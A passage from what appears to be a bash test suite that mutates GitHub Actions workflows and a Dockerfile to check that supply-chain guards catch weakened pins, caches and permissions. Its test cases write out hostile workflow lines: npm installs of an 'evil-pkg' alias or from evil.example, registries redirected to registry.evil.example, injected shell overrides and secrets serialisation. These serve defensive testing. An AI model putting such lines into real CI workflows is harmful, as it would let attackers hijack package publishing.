		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    container:\n      image: x\n      env:\n        NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
		'publish-sidecar: its container sets NPM_VERSION over the workflow pin'
	expect_caught 'a workflow with no pin of its own gaining a job-level one (#960)' npmpin "$WORKFLOWS/test.yml" \
		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    steps:\n      - run: npm install -g "npm@${NPM_VERSION}"\n' \
		'sneak: sets NPM_VERSION over the workflow pin'
	expect_caught 'a global install of npm through an npm: alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@npm:evil-pkg@12.1.0"' \
		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
	expect_caught 'a global install of a scoped package through an alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "@scope/tool@npm:evil-pkg@1.0.0"' \
		'global install of @scope/tool@npm:evil-pkg@1.0.0 is not an exact version'
	expect_caught 'a global install with the flag before the verb (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm -g install "npm@npm:evil-pkg@12.1.0"' \
		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
	expect_caught 'a global install of a URL (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm i -g https://evil.example/x@1.2.3' \
		'global install of https://evil.example/x@1.2.3 is not an exact version'
	expect_caught 'the alias installed with the flag first in the npm publish job (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' $'          npm install -g "npm@${NPM_VERSION}"\n          npm -g install "npm@npm:evil-pkg@12.1.0"' \
		'publish-sidecar: publishes with id-token and runs: npm -g install'
	expect_caught 'the pinned install pointed at another registry on its own line (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm_config_registry=https://registry.evil.example/ npm install -g "npm@${NPM_VERSION}"' \
		'publish-sidecar: publishes with id-token and runs: npm_config_registry='
	expect_caught 'npm_config_registry in the npm publish job env (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      npm_config_registry: https://registry.evil.example/\n' \
		'publish-brain: job env sets npm_config_registry in a job that publishes with id-token'
	expect_caught 'setup-node pointing the npm publish job at another registry (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		'          registry-url: "https://registry.npmjs.org"' '          registry-url: "https://registry.evil.example"' \
		'publish-brain: setup-node registry-url is'
	expect_caught 'a default shell that sets NPM_VERSION first (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}\n' \
		'publish-brain: step with shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}'
	expect_caught 'a step shell that runs code before the script (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        shell: bash -c \x27export NPM_VERSION=npm:evil-pkg@12.1.0; . {0}\x27\n        run: |' \
		'publish-brain: step with shell: bash -c'
	expect_caught 'the pinned install without its exact-version check (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' '' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm@${NPM_VERSION} without the exact-version check'
	expect_caught 'the exact-version check loosened (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' '          [[ "$NPM_VERSION" =~ ^.+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' \
		'installs npm@${NPM_VERSION} without the exact-version check'
	expect_caught 'the exact-version check after the install (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n          npm install -g "npm@${NPM_VERSION}"\n' $'          npm install -g "npm@${NPM_VERSION}"\n          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' \
		'installs npm@${NPM_VERSION} without the exact-version check'
	expect_caught 'the pinned install in a step that may continue on error (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        continue-on-error: true\n        run: |' \
		'may continue on error'
	expect_caught 'a GITHUB_ENV line built from an env value (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          L: "NPM_VERSION=npm:evil-pkg@12.1.0"\n        run: |' \
		'has an env value that sets NPM_VERSION'
	expect_caught 'NPM_VERSION appended to (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          NPM_VERSION+=-x\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION read from input (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          read -r NPM_VERSION <v.txt\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION set by printf -v (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          printf -v NPM_VERSION %s x\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
}
# The image publish-docker pushes is built FROM these (#783). A base by tag
# alone is whatever the registry says that day, so every external FROM names a
# tag AND a digest, one tag never maps to two digests, and the Bun bases run
# the Bun CI tests (release-exec.yml BUN_VERSION).
# dockerfile_check <Dockerfile> <workflow with BUN_VERSION>: one violation per
# line, nothing when clean.
dockerfile_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DOCKERFILE="$1" FILE="$2" bun -e '
const text = await Bun.file(process.env.DOCKERFILE).text();
const bun = String(Bun.YAML.parse(await Bun.file(process.env.FILE).text()).env?.BUN_VERSION ?? "");
const out = [];
if (!/^\d+\.\d+\.\d+$/.test(bun)) out.push("BUN_VERSION is not an exact version: " + JSON.stringify(bun));
const stages = new Set(["scratch"]);
const digests = new Map();
let bases = 0;
// Continuations joined, so a FROM split over lines is still one instruction.
for (const line of text.replace(/\\\r?\n/g, " ").split(/\r?\n/)) {
  const m = /^\s*FROM\s+(.*)$/i.exec(line);
  if (!m) continue;
  const words = m[1].trim().split(/\s+/).filter((w) => !w.startsWith("--"));
  const image = words[0] ?? "";
  const as = words.findIndex((w) => /^as$/i.test(w));
  // A stage defined on an EARLIER line is not a registry image.
  const local = stages.has(image.toLowerCase());
  if (as > 0 && words[as + 1]) stages.add(words[as + 1].toLowerCase());
  if (local) continue;
  const p = /^([^\s@:]+(?::\d+)?(?:\/[^\s@:]+)*):([^\s@:]+)@sha256:([0-9a-f]{64})$/.exec(image);
  if (!p) { out.push("FROM " + image + " is not pinned by tag and digest (name:tag@sha256:...)"); continue; }
  const [, name, tag, sum] = p;
  const key = name.replace(/^(docker\.io\/)?(library\/)?/, "") + ":" + tag;
  if (digests.has(key) && digests.get(key) !== sum) out.push(key + " is pinned to two different digests");
  digests.set(key, sum);
  if (/^(docker\.io\/)?oven\/bun$/.test(name)) {
    bases++;
    if (tag !== bun && !tag.startsWith(bun + "-"))
      out.push("FROM " + image + " runs Bun " + tag + ", but CI tests BUN_VERSION " + bun);
  }
}
// Without this, a Dockerfile that stopped naming oven/bun would pass vacuously.
if (bases === 0) out.push("no oven/bun base image found, so the Bun version check checked nothing");
if (out.length) console.log(out.join("\n"));
'
}
found="$(dockerfile_check "${HERE}/../../Dockerfile" "$WORKFLOWS/release-exec.yml")"
if [ -z "$found" ]; then
	ok "Dockerfile: every base image is pinned by tag and digest, and the Bun bases match BUN_VERSION"
else
	no "Dockerfile: every base image is pinned by tag and digest, and the Bun bases match BUN_VERSION" "$found"
fi
# dockerfile_caught <label> <exact text> <replacement>: a mutated Dockerfile copy must be reported.
dockerfile_caught() {
	local copy="${WORK}/Dockerfile.mutant"
	if ! FROM="${HERE}/../../Dockerfile" TO="$copy" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
'; then
		no "Dockerfile mutant '$1' could be applied (the Dockerfile no longer has the text it mutates)"
		return
	fi
	if [ -n "$(dockerfile_check "$copy" "$WORKFLOWS/release-exec.yml")" ]; then
		ok "reports: $1"
	else
		no "reports: $1" "the check passed a Dockerfile with this hole"
	fi
}
dockerfile_caught 'a floating oven/bun:1 base (#783)' \
	'FROM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS deps' 'FROM oven/bun:1 AS deps'
dockerfile_caught 'a floating slim production base (#783)' \
	'FROM oven/bun:1.4.2-slim@sha256:cb3bbbb08e13a4a2ff400f24c7a2a1d5efa83f6ef8544d52d95a519631e2fc61 AS production' 'FROM oven/bun:1.4.2-slim AS production'
dockerfile_caught 'a digest-pinned base on a Bun CI does not test (#783)' \
	'FROM oven/bun:1.4.2-slim@sha256:' 'FROM oven/bun:1.3.14-slim@sha256:'
dockerfile_caught 'one tag pinned to two digests (#783)' \
	'FROM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS deps' 'FROM oven/bun:1.4.2@sha256:0000000000000000000000000000000000000000000000000000000000000000 AS deps'
dockerfile_caught 'an undigested base behind --platform (#783)' \
	'FROM --platform=$BUILDPLATFORM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS workflows' 'FROM --platform=$BUILDPLATFORM oven/bun:latest AS workflows'
dockerfile_caught 'some other base image by tag alone (#783)' \
	'FROM deps AS build' 'FROM debian:trixie AS build'
# ...and every other Bun pin is that same version (#783 review): the image
# runs what CI tests only while CI tests one Bun. Every `bun-version:` and
# BUN_VERSION in the workflows and in local composite actions (inputs
# defaults), with env references resolved, and every oven/bun image a run:
# starts (by digest).
# bun_pins <workflow dir> <actions dir>: one violation per line.
bun_pins() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DIR="$1" ACTIONS="$2" bun -e '
const fs = require("node:fs");
const out = [];
const want = String(Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/release-exec.yml", "utf8")).env?.BUN_VERSION ?? "");
const envRef = /^\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}$/;
const inputRef = /^\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}$/;
let seen = 0;
const visit = (file, o, path, scopes, inputs) => {
  if (!o || typeof o !== "object") return;
  const env = o.env && typeof o.env === "object" ? [o.env, ...scopes] : scopes;
  for (const [k, v] of Object.entries(o)) {
    if ((k === "bun-version" || k === "BUN_VERSION") && (typeof v === "string" || typeof v === "number")) {
      let val = String(v);
      const e = envRef.exec(val);
      if (e) { const sc = env.find((x) => x && e[1] in x); if (sc) val = String(sc[e[1]]); }
      const n = inputRef.exec(val);
      if (n && inputs && n[1] in inputs) val = String(inputs[n[1]]?.default ?? "");
      seen++;
      if (val !== want) out.push(file + ": " + path + "." + k + " is " + JSON.stringify(val) + ", but release-exec.yml BUN_VERSION (and so the Dockerfile) is " + JSON.stringify(want));
    }
    // An oven/bun image a run: starts is a Bun pin too, and must carry a digest.
    if (k === "run" && typeof v === "string")
      for (const m of v.matchAll(/\boven\/bun:([^\s@\\]+)(@sha256:[0-9a-f]{64})?/g)) {
        seen++;
        if (m[1] !== want && !m[1].startsWith(want + "-")) out.push(file + ": " + path + " runs " + m[0] + ", not Bun " + JSON.stringify(want));
        if (!m[2]) out.push(file + ": " + path + " runs " + m[0] + " without a digest");
      }
    if (v && typeof v === "object") visit(file, v, path + "." + k, env, inputs);
  }
};
for (const f of fs.readdirSync(process.env.DIR).filter((x) => /\.ya?ml$/.test(x))) {
  const doc = Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/" + f, "utf8"));
  visit(f, doc, "", [], null);
}
for (const d of fs.existsSync(process.env.ACTIONS) ? fs.readdirSync(process.env.ACTIONS) : [])
  for (const a of ["action.yml", "action.yaml"]) {
    const p = process.env.ACTIONS + "/" + d + "/" + a;
    if (!fs.existsSync(p)) continue;
    const doc = Bun.YAML.parse(fs.readFileSync(p, "utf8"));
    // An input default is a pin too.
    for (const [k, v] of Object.entries(doc.inputs ?? {}))
      if (k === "bun-version") { seen++; if (String(v?.default ?? "") !== want) out.push(d + "/" + a + ": input bun-version defaults to " + JSON.stringify(v?.default) + ", not " + JSON.stringify(want)); }
    visit(d + "/" + a, doc.runs ?? {}, "runs", [], doc.inputs ?? {});
  }
if (seen === 0) out.push("no Bun pins found, so the agreement check checked nothing");
if (out.length) console.log(out.join("\n"));
'
}
ACTIONS_DIR="${HERE}/../actions"
found="$(bun_pins "$WORKFLOWS" "$ACTIONS_DIR")"
if [ -z "$found" ]; then
	ok "every Bun pin in the workflows and local actions is release-exec.yml BUN_VERSION, the Bun the image runs"
else
	no "every Bun pin in the workflows and local actions is release-exec.yml BUN_VERSION" "$found"
fi
# bun_pin_caught <label> <file under .github> <exact text> <replacement>
bun_pin_caught() {
	rm -rf "${WORK}/pins" && mkdir -p "${WORK}/pins" && cp -rL "$WORKFLOWS" "${WORK}/pins/workflows" && cp -rL "$ACTIONS_DIR" "${WORK}/pins/actions"
	if ! FROM="${WORK}/pins/$2" OLD="$3" NEW="$4" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
'; then
		no "Bun pin mutant '$1' could be applied (the file no longer has the text it mutates)"
		return
	fi
	if [ -n "$(bun_pins "${WORK}/pins/workflows" "${WORK}/pins/actions")" ]; then ok "reports: $1"; else no "reports: $1" "the check passed this drift"; fi
}
bun_pin_caught 'test.yml testing a different Bun than the image runs (#783 review)' workflows/test.yml 'bun-version: "1.4.2"' 'bun-version: "1.3.14"'
bun_pin_caught 'the catalog sync on its own Bun (#783 review)' workflows/sync-pieces-catalog.yml '  BUN_VERSION: "1.4.2"' '  BUN_VERSION: "1.3.14"'
bun_pin_caught 'the composite action defaulting to another Bun (#783 review)' actions/bun-setup/action.yml 'default: "1.4.2"' 'default: "1.3.14"'
bun_pin_caught 'the catalog inspect image left on another Bun (#783 owner decision)' workflows/sync-pieces-catalog.yml 'oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895' 'oven/bun:1.3.14@sha256:e10577f0db68676a7024391c6e5cb4b879ebd17188ab750cf10024a6d700e5c4'
bun_pin_caught 'the catalog inspect image by tag alone (#783 owner decision)' workflows/sync-pieces-catalog.yml 'oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895' 'oven/bun:1.4.2'
bun_pin_caught 'release-exec.yml moved alone, leaving the rest behind (#783 review)' workflows/release-exec.yml '  BUN_VERSION: "1.4.2"' '  BUN_VERSION: "1.3.14"'
# release-exec.yml alone holds id-token + packages: write; if the derivation
# found nothing, the derivation is broken, not the repository clean.
if grep -q 'release-exec.yml' < <(for f in "$WORKFLOWS"/*.yml; do [ -n "$(check authority "$f")" ] && basename "$f"; done); then
	ok "the authority derivation finds release-exec.yml (${held} workflow(s) hold authority)"
else
	no "the authority derivation finds release-exec.yml"
fi

echo
echo "per-job authority on the release path"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): no id-token matrix, no inherited secrets, OIDC publish jobs run no build, no persisted credentials, artifacts taken by digest" narrow "$f"
done

echo
echo "no job that ships an image restores it from a cache (#782, #868)"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): every image a shipping job builds is built cold" pushcache "$f"
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	# The build that ships pushes nothing since #868: it is shipping because
	# its archive is uploaded for publish-docker to push.
	expect_caught 'the gha cache back on the build that ships into the archive (#782, #868)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that builds an image and uploads an artifact'
	expect_caught 'a registry cache back on the build that ships into the archive (#782, #868)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n          cache-from: type=registry,ref=ghcr.io/x/y:cache\n' \
		'in a job that builds an image and uploads an artifact'
	expect_caught 'a buildx command line restoring a cache in the job that ships the archive (#782)' pushcache "$WORKFLOWS/release-exec.yml" \
		'      - name: Digest the archive' $'      - run: docker buildx build --cache-from type=gha -o type=oci,dest=x.tar .\n      - name: Digest the archive' \
		'runs a build with --cache-from in a job that builds an image and uploads an artifact'
	expect_caught 'the build step spelled in another case, with its cache back (#782)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0\n        with:\n          context: .\n' \
		$'        uses: Docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0\n        with:\n          cache-from: type=gha\n          context: .\n' \
		'restores cache-from'
	# A build that pushes through `outputs:` (push=true, as build-image did
	# from #680 to #868) is a push whether or not the job also logs in or
	# uploads anything: with the archive export replaced by a push, the cache
	# coming back must still be reported, for the push.
	expect_caught 'the gha cache back on a build that pushes only through outputs push=true (#680)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=image,name=ghcr.io/${{ github.repository }},push-by-digest=true,name-canonical=true,push=true\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that pushes'
	# BuildKit parses the value as a Go bool: 1 and t push too (#680 review).
	expect_caught 'the gha cache back on a build that pushes through outputs push=1 (#680 review)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=image,name=ghcr.io/${{ github.repository }},push=1\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that pushes'
	# A job that pushes only through skopeo, with no login, no push flag and
	# no imagetools: the validate-only docker-build.yml job with a skopeo
	# copy added, so only the skopeo detection can report its cache (#868).
	expect_caught 'a cached build in a job that pushes only through skopeo (#868)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - run: skopeo copy docker-daemon:jarvis:ci docker://ghcr.io/o/r:ci\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that pushes'
	# The same, with a global flag before the subcommand (#868 review).
	expect_caught 'a cached build in a job that pushes through skopeo --debug copy (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - run: skopeo --debug copy docker-daemon:jarvis:ci docker://ghcr.io/o/r:ci\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that pushes'
	# Away from release-exec.yml, so the image mode there cannot be what
	# catches them: the cached validate build gaining an upload of a parent
	# directory, or of the same path spelled another way (#868 review).
	expect_caught 'a cached build uploading the directory holding its output (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: image\n          path: ${{ runner.temp }}\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that builds an image and uploads an artifact'
	expect_caught 'a classic docker build with a cache, saved and uploaded (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		$'      - name: Build Docker image (validate)\n        uses: docker/build-push-action@v7\n        with:\n          context: .\n          file: ./Dockerfile\n          platforms: linux/amd64\n          push: false\n          load: true\n          tags: ${{ env.IMAGE_TAG }}\n          build-args: VERSION=0.0.0-ci\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n' \
		$'      - run: docker build --cache-from jarvis:ci -t jarvis:ci . && docker save jarvis:ci -o i.tar\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: image\n          path: i.tar\n' \
		'runs a build with --cache-from in a job that builds an image and uploads an artifact'
}

echo
echo "the catalog sync processes third-party data without write access"
expect_clean "sync-pieces-catalog.yml: no job that installs dependencies or runs the generator holds a write scope; installs are frozen" \
	untrusted "$WORKFLOWS/sync-pieces-catalog.yml"

echo
echo "the catalog PR is opened with a token whose CI runs"
expect_clean "sync-pieces-catalog.yml: create-pull-request takes RELEASE_PR_TOKEN alone, after a step that refuses without it" \
	catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml"

echo
echo "each rule reports the hole it exists for (mutated copies)"
expect_caught 'a workflow and job with no permissions anywhere' scoped "$WORKFLOWS/test.yml" \
	$'permissions:\n  contents: read\n' ''
expect_caught 'a publish job with no permissions of its own' publish-perms "$WORKFLOWS/release-exec.yml" \
	$'  discord-notify:\n    needs: [validate-tag, github-release]\n    if: ${{ inputs.dry_run != true }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n' \
	$'  discord-notify:\n    needs: [validate-tag, github-release]\n    if: ${{ inputs.dry_run != true }}\n    runs-on: ubuntu-latest\n'
expect_caught 'write scopes back at the top of the publish path' publish-perms "$WORKFLOWS/release-exec.yml" \
	$'permissions: {}\n' $'permissions:\n  contents: write\n'
expect_caught 'a major tag on the publish path' pinned "$WORKFLOWS/release-exec.yml" \
	'uses: softprops/action-gh-release@' 'uses: softprops/action-gh-release@v2 #'
# A read-only workflow gaining a write scope must come under the pin rule:
# test.yml still uses tags, so granting it write has to surface them.
copy="${WORK}/authority.yml"
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n"));
'
if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
	ok "reports: a read-only workflow that gains a write scope while using tags"
else
	no "reports: a read-only workflow that gains a write scope while using tags"
fi
# #687: a secret is authority on its own. test.yml stays read-only here and
# only gains a secret reference; its tags must surface.
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n"));
'
if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
	ok "reports: a read-only workflow that reads a secret while using tags"
else
	no "reports: a read-only workflow that reads a secret while using tags"
fi
# ...and secrets.GITHUB_TOKEN alone is not: its scope is the permissions block.
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"));
'
if [ -z "$(check authority "$copy")" ]; then
	ok "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
else
	no "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
fi
# #687: the pin rule descends into local composite actions. bun-setup still
# uses tags, so an authority workflow that starts using it must be reported.
expect_caught 'a local composite action with tagged actions, used where authority is held' pinned "$WORKFLOWS/release.yml" \
	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
expect_caught 'a cached Bun inside a local composite action, used where authority is held' mutable "$WORKFLOWS/release.yml" \
	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  ALL: ${{ toJSON(secrets) }}\n"));
'
if [ -n "$(check authority "$copy")" ]; then
	ok "reports: a workflow that serialises the whole secrets context holds authority"
else
	no "reports: a workflow that serialises the whole secrets context holds authority"
fi
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  K: ${{ format(\x27{0}\x27, SECRETS.SOME_KEY) }}\n"));
'
if [ -n "$(check authority "$copy")" ]; then
	ok "reports: a secret read inside a format string, in upper case"
else
	no "reports: a secret read inside a format string, in upper case"
fi
expect_caught 'a local composite action that installs dependencies, in the job that publishes with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
	'      - name: Ensure npm supports Trusted Publishing' $'      - uses: ./.github/actions/bun-setup\n      - name: Ensure npm supports Trusted Publishing'
expect_caught 'a local action that does not exist' pinned "$WORKFLOWS/release.yml" \
	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/nope
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
expect_caught 'a major tag in a pull_request_target workflow' pinned "$WORKFLOWS/labeler.yml" \
	'uses: actions/labeler@bf12e9b00b37c5c0ca2b87b79b2daf7891dbda13' 'uses: actions/labeler@v5'
expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-release.yml" \
	'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'uses: actions/checkout@3d3c42e'
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'npm@latest back in a job holding id-token' mutable "$WORKFLOWS/release-exec.yml" \
		'npm install -g "npm@${NPM_VERSION}"' 'npm install -g npm@latest'
	expect_caught 'a floating Bun reached through env indirection' mutable "$WORKFLOWS/release-exec.yml" \
		'  BUN_VERSION: "1.4.2"' '  BUN_VERSION: latest'
	expect_caught 'a floating Bun in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
		'bun-version: "1.4.2"' 'bun-version: latest'
	expect_caught 'the binfmt image back to its :latest default' mutable "$WORKFLOWS/release-exec.yml" \
		$'          image: ${{ env.BINFMT_IMAGE }}\n' ''
	expect_caught 'the privileged binfmt image restored from the Actions cache' mutable "$WORKFLOWS/release-exec.yml" \
		'          cache-image: false' '          cache-image: true'
	expect_caught 'BuildKit by tag instead of digest' mutable "$WORKFLOWS/release-exec.yml" \
		'BUILDKIT_IMAGE: moby/buildkit:v0.33.1@sha256:' 'BUILDKIT_IMAGE: moby/buildkit:buildx-stable-1 #'
	expect_caught 'BuildKit back to its default image' mutable "$WORKFLOWS/release-exec.yml" \
		$'        with:\n          driver-opts: image=${{ env.BUILDKIT_IMAGE }}\n' ''
	expect_caught 'the SBOM generator back to its default tag on the build that ships (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		'          sbom: generator=${{ env.SBOM_GENERATOR }}' '          sbom: true' \
		'SBOM generator image is not pinned by digest'
	expect_caught 'the SBOM generator back to its default tag on the dry-run twin (#680)' mutable "$WORKFLOWS/release-exec.yml" \
		$'          sbom: generator=${{ env.SBOM_GENERATOR }}\n          outputs: type=oci' $'          sbom: true\n          outputs: type=oci' \
		'SBOM generator image is not pinned by digest'
	expect_caught 'the SBOM generator pin loosened to its tag (#680)' mutable "$WORKFLOWS/release-exec.yml" \
